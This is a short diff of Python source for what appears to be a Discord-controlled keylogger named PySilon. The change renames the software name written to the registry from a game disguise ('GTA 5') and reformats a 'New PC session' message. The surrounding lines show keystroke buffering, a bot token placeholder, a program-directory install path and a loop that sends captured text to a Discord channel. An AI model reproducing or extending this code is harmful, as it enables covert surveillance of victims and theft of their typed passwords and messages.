@@ -14,7 +14,7 @@ ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\
 text_buffor, force_to_send = '', False
 
 bot_token = ''   # Paste here BOT-token
-software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
+software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
 
@@ -36,7 +36,7 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 @client.event
 async def on_ready():
     global text_buffor, force_to_send
-    await client.get_channel(channel_ids['main']).send('[' + current_time() + '] New PC session')
+    await client.get_channel(channel_ids['main']).send('```[' + current_time() + '] New PC session```')
     while True:
         await asyncio.sleep(0.1)
         if len(text_buffor) > 1500 or force_to_send:
